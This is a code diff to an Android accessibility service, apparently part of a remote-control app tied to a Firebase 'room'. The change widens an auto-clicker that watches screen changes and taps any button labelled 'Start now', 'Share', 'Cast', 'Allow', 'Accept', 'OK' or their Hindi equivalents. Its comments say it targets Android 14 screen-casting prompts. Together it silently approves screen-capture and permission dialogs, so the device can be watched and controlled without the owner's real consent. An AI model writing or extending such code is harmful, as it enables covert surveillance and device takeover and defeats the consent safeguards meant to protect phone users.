@@ -16,12 +16,20 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
+import java.util.Arrays;
+import java.util.List;
 
 public class MyAccessibilityService extends AccessibilityService {
     private String roomId;
     private Path swipePath;
     private long swipeStartTime = 0;
     private long lastTouchTime = 0;
+
+    // Hindi + English dono ke keywords
+    private final List<String> allowKeywords = Arrays.asList(
+            "start now", "start", "share", "cast", "allow", "accept", "ok", 
+            "शुरू करें", "साझा करें", "अनुमति दें", "स्वीकार करें", "ठीक है", "कास्ट करें"
+    );
 
     @Override
     public void onServiceConnected() {
@@ -88,37 +96,61 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode != null) {
-                // Auto-Clicker: Android 14 ke alag-alag button names
-                findAndClickButton(rootNode, "Start now");
-                findAndClickButton(rootNode, "Start Now");
-                findAndClickButton(rootNode, "Start");
-                findAndClickButton(rootNode, "Cast");
-                findAndClickButton(rootNode, "Share");
-                findAndClickButton(rootNode, "Allow");
+                searchAndClick(rootNode);
             }
         }
     }
 
-    private void findAndClickButton(AccessibilityNodeInfo node, String textToFind) {
+    private void searchAndClick(AccessibilityNodeInfo node) {
         if (node == null) return;
-        if (node.getText() != null && node.getText().toString().toLowerCase().contains(textToFind.toLowerCase())) {
-            if (node.isClickable()) {
-                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                return;
-            } else {
-                AccessibilityNodeInfo parent = node.getParent();
-                if (parent != null && parent.isClickable()) {
-                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    return;
+
+        // Check node text
+        if (node.getText() != null) {
+            String text = node.getText().toString().toLowerCase();
+            for (String keyword : allowKeywords) {
+                if (text.contains(keyword)) {
+                    if (clickNodeOrParent(node)) return;
                 }
             }
         }
-        for (int i = 0; i < node.getChildCount(); i++) {
-            findAndClickButton(node.getChild(i), textToFind);
+
+        // Check content description (Icons have this instead of text)
+        if (node.getContentDescription() != null) {
+            String desc = node.getContentDescription().toString().toLowerCase();
+            for (String keyword : allowKeywords) {
+                if (desc.contains(keyword)) {
+                    if (clickNodeOrParent(node)) return;
+                }
+            }
         }
+
+        // Recursively search children
+        for (int i = 0; i < node.getChildCount(); i++) {
+            searchAndClick(node.getChild(i));
+        }
+    }
+
+    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
+        if (node.isClickable()) {
+            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            return true;
+        }
+        AccessibilityNodeInfo parent = node.getParent();
+        int depth = 0;
+        while (parent != null && depth < 4) { // Search 4 levels up
+            if (parent.isClickable()) {
+                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                return true;
+            }
+            parent = parent.getParent();
+            depth++;
+        }
+        return false;
     }
 
     private void performGlobalActionFromCommand(String cmd) {
